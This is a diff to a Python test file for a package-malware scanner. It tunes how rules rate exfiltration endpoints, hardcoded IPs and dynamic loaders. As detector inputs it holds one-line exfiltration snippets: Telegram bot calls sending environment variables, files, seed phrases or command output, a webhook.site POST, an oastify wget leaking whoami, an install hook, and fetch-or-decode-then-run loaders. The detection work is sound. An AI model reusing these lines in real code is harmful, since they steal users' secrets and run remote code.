@@ -269,8 +269,9 @@ def test_a_placeholder_tunnel_host_is_low(text: str) -> None:
         "fetch('https://purple-river-1234.trycloudflare.com/c')",  # a real quick-tunnel name
         "https://sidebar.ngrok.io/x",  # a word, not a placeholder label
         "https://myexample.ngrok.io/x",
-        "if (h.endsWith('.trycloudflare.com')) go()",  # bare suffix: kept on purpose
-        "https://example.com/webhook.site",  # not a tunnel host
+        # a bare suffix in a file that collects (v8 lowers it in one that doesn't)
+        "if (h.endsWith('.trycloudflare.com')) go(os.hostname())",
+        "require('child_process'); x = 'https://example.com/webhook.site'",  # not a tunnel host
     ],
 )
 def test_a_real_tunnel_host_stays_high(text: str) -> None:
@@ -288,12 +289,14 @@ def test_a_host_in_a_list_of_domains_is_low() -> None:
 @pytest.mark.parametrize(
     "text",
     [
-        "const hosts = ['webhook.site', 'mailinator.com'];",  # one other domain: not a list
-        "send('https://webhook.site/abc', ['a.com', 'b.com', 'c.com'])",  # a URL
-        "x = ['1.0.0', 'webhook.site', '2.0.0']",  # versions are no domains
-        "x = ['webhook.site', 'index.js', 'webhook.site']",  # its own host twice
-        "x = ['webhook.site', 'a.com', 'A.com', 'a.com']",  # one other domain
-        "h = 'webhook.site'" + " " * 500 + "['a.com', 'b.com']",  # outside the window
+        # v8 lowers a bare `webhook.site` in a file that collects nothing: these collect
+        "os.hostname(); const hosts = ['webhook.site', 'mailinator.com'];",  # not a list
+        # a URL
+        "send('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a', ['a.com', 'b.com'])",
+        "os.hostname(); x = ['1.0.0', 'webhook.site', '2.0.0']",  # versions: no domains
+        "os.hostname(); x = ['webhook.site', 'index.js', 'webhook.site']",  # its own host
+        "os.hostname(); x = ['webhook.site', 'a.com', 'A.com', 'a.com']",  # one domain
+        "os.hostname(); h = 'webhook.site'" + " " * 500 + "['a.com', 'b.com']",  # too far
         # a table of ngrok's region hosts: kept on purpose since v5 (gina, cro-pricing)
         "REGIONS = {us: 'us.ngrok.io', eu: 'eu.ngrok.io', ap: 'ap.ngrok.io', au: 'au.ngrok.io'}",
         "x = ['webhook.site', 'a.ngrok.io', 'mailinator.com']",  # one other non-endpoint
@@ -349,16 +352,18 @@ def test_what_cannot_be_an_endpoint_is_low(text: str, note: str) -> None:
         "fetch('https://pastebin.com/raw/N21QzeQA')",  # read through the raw endpoint
         "fetch('https://pastebin.com/N21QzeQAb')",  # another paste
         "fetch('https://pastebin.com/xYz12345')",
-        "x = '**webhook.site** receives it'",  # Markdown emphasis, not a pattern
+        "os.hostname(); x = '**webhook.site** receives it'",  # Markdown emphasis
         "dns.lookup(`94bp9h8fte9kz9v8btc6in8qnht8h85x.oastify.com`, () => {});",  # a real id
         # a real id behind a word (`@frontend-clients/core@99.0.8`, DataDog malicious)
         "wget http://YourServer929w1e528by00hxp38ah5mh1asgj4bs0.oastify.com/?u=$(whoami)",
         "dns.lookup(`${hex}.oastify.com`)",  # a template: how DNS exfiltration builds hosts
         "x = 'a.com\\nwebhook.site'",  # one other domain: not a list
-        "post('https://webhook.site/abc,https://a.com,https://b.com')",  # a URL, not an entry
+        # a URL, not an entry
+        "post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a,https://a.com,https://b.com')",
         "x = 'eu.ngrok.io\\nus.ngrok.io\\nap.ngrok.io\\nau.ngrok.io'",  # a table of endpoints
-        "x = 'webhook.site\\nmailinator.com'" + " " * 500 + "'\\na.com\\nb.com\\n'",  # too far
-        "post(`https://api.telegram.org/bot${t}/x`, ['\\na.com', '\\nb.com'])",  # kept on purpose
+        "os.hostname(); x = 'webhook.site\\nmailinator.com'" + " " * 500 + "'\\na.com\\nb.com\\n'",
+        # a handed token in a file that collects (v8 lowers it in one that doesn't)
+        "post(`https://api.telegram.org/bot${t}/x`, ['\\na.com', '\\nb.com'], os.hostname())",
     ],
 )
 def test_endpoints_v7_keeps_high(text: str) -> None:
@@ -387,10 +392,141 @@ def test_example_addresses_are_low_and_more_resolvers_are_not_findings() -> None
 
 def test_low_matches_never_hide_a_real_one() -> None:
     """Placeholders don't count toward the rule's cap of matches."""
-    text = "\n".join(["see https://example.ngrok.app"] * 5 + ["post('https://webhook.site/x')"])
+    text = "\n".join(
+        ["see https://example.ngrok.app"] * 5
+        + ["post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')"]
+    )
     found = _exfil(text)
     assert found.count(("low", 1.0)) == 3
     assert found[-1] == ("high", 5.0)
+
+
+_UUID = "0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"
+
+
+@pytest.mark.parametrize(
+    ("text", "note"),
+    [
+        # notifiers for the user's own bot: the code is handed the token
+        (
+            "await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, opts)",
+            "a notifier for the user's own bot.",
+        ),
+        ('const base = "https://api.telegram.org/bot" + token;', "the user's own bot."),
+        ('"url": "https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/getMe"', "own bot."),
+        ("$r = wp_remote_post('https://api.telegram.org/bot'.tg_token().'/sendMessage');", "bot."),
+        ('url = f"https://api.telegram.org/bot{self.token}/sendMessage"', "own bot."),
+        # a webhook.site mention with no bin id near it
+        ('example: "curl https://webhook.site/test",', "a mention, not an endpoint."),
+        ("  # For testing, create a sample alerting webhook at http://webhook.site/", "mention"),
+        # a tunnel's bare suffix, and the API cloudflared registers with
+        ("if (!host.endsWith('.trycloudflare.com')) return false", "no tunnel's name"),
+        ("server: { allowedHosts: ['.ngrok-free.app'] }", "no tunnel's name"),
+        (" * a random https://….trycloudflare.com address, no account needed", "tunnel's name"),
+        ("log('no URL (api.trycloudflare.com reachable?)')", "no tunnel's name"),
+    ],
+)
+def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> None:
+    """v8 (round 4, D1-D3): nothing in the file collects anything to send."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert matches
+    assert {(m.severity.value, m.weight) for m in matches} == {("low", 1.0)}
+    assert all(note in m.explanation for m in matches)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # what is sent: identity, the environment, files, processes, credentials
+        "const t = process.env.BOT; fetch(`https://api.telegram.org/bot${t}/x?h=${os.hostname()}`)",
+        "post(`https://api.telegram.org/bot${t}/sendMessage`, {text: JSON.stringify(process.env)})",
+        "form.append('document', fs.createReadStream(p));"
+        " axios.post(`https://api.telegram.org/bot${t}/sendDocument`, form)",
+        "for (const f of fs.readdirSync(dir)) post(`https://api.telegram.org/bot${t}/x`, f)",
+        "const { exec } = require('child_process'); exec('id', o =>"
+        " fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?text=${o}`))",
+        "send(read(home + '/.npmrc'), `https://api.telegram.org/bot${t}/sendMessage`)",
+        "if (seedPhrase) post(`https://api.telegram.org/bot${t}/sendMessage`, seedPhrase)",
+        # a token literal anywhere in the file, the token written in the URL, a shell token
+        "const T = '7123456789:AAH4xYzAbCdEfGhIjKlMnOpQrStUvWxYz12'; "
+        "fetch(`https://api.telegram.org/bot${T}/sendMessage`)",
+        "fetch('https://api.telegram.org/bot7123456789:AAH4x/sendMessage')",
+        'curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d text=hi',
+        # an install hook's line
+        '  "postinstall": "node -e \\"fetch(\'https://api.telegram.org/bot\'+t)\\""',
+        # a webhook.site bin id near the host, or a custom subdomain
+        f"const options = {{ hostname: 'webhook.site', path: '/{_UUID}', method: 'POST' }};",
+        f"fetch('https://webhook.site/{_UUID}', {{ method: 'POST', body }})",
+        "fetch('https://acme.webhook.site/in', { method: 'POST', body })",
+        # a real quick-tunnel name, a TCP tunnel, a bare suffix in a file that collects
+        "fetch('https://purple-river-1234.trycloudflare.com/c')",
+        "client.connect(13532, '0.tcp.in.ngrok.io', () => {})",
+        "if (h.endsWith('.trycloudflare.com')) send(os.userInfo())",
+    ],
+)
+def test_what_is_sent_keeps_high(text: str) -> None:
+    """v8: anything collected in the same file, a written token, a bin id, a tunnel's name."""
+    assert ("high", 5.0) in _exfil(text)
+
+
+def test_ip_on_a_comment_line_is_low() -> None:
+    """`static.hardcoded-ip` v5 (round 4, D4)."""
+
+    def ips(text: str) -> list[tuple[str, float]]:
+        return [
+            (m.severity.value, m.weight)
+            for m in analyse(text.encode())
+            if m.rule_id == "static.hardcoded-ip"
+        ]
+
+    for text in (
+        "    // return 'http://47.108.170.69:5401'",
+        "  // baseURL: 'http://120.253.136.198:36011/sy/h5/init'",
+        " * @returns `https://cube.example.org/api/v1/` or `http://129.153.33.80/api/v1/`.",
+        "/* fallback: http://45.33.32.156:8080 */",
+        "# curl http://45.33.32.156/x",
+        "<!-- served from http://45.33.32.156 -->",
+    ):
+        assert ips(text) == [("low", 1.0)], text
+    for text in (
+        'const API = "http://45.33.32.156:8080";',
+        '/*! lib v1 */ fetch("http://45.33.32.156/x")',  # the comment closed before it
+        'const u = "http://45.33.32.156/x" // prod',  # code, then a comment
+        "#!/bin/sh\nwget http://45.33.32.156/p",  # a shebang is no comment
+        "#hdr { background: url(http://45.33.32.156/x.png) }",  # a CSS selector
+    ):
+        assert ("medium", 3.0) in ips(text), text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'new Function("require", "module", "exports", code)(load, mod, mod.exports)',
+        "const fn = new Function('require', 'module', 'exports', 'registerSlotBuilders', src);",
+        'new Function("require", "exports", compiled)(req, exp)',
+    ],
+)
+def test_a_module_wrapper_in_a_quiet_file_is_low(text: str) -> None:
+    """`static.function-require` v2 (round 4, D5)."""
+    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.function-require"]
+    assert (match.severity.value, match.weight) == ("low", 1.0)
+    assert "A module wrapper" in match.explanation
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'new Function("require", runnable)(require);',  # `require` alone
+        "(new Function('require','__dirname',''))(require,__dirname);",
+        "const data = await (await fetch(url)).json(); new Function("
+        "'require', 'module', 'exports', data.credits)(require, m, m.exports);",
+        'new Function("require", "module", Buffer.from(s, "base64").toString())(require, m)',
+        "new (Function.constructor)('require', 'module', response.data.model)(require, m)",
+    ],
+)
+def test_a_loader_that_fetches_or_decodes_stays_medium(text: str) -> None:
+    (match,) = [m for m in analyse(text.encode()) if m.rule_id == "static.function-require"]
+    assert (match.severity.value, match.weight) == ("medium", 3.0)
 
 
 # Inert stand-ins for a Baileys fork's code: made-up channel ids, nothing that runs.
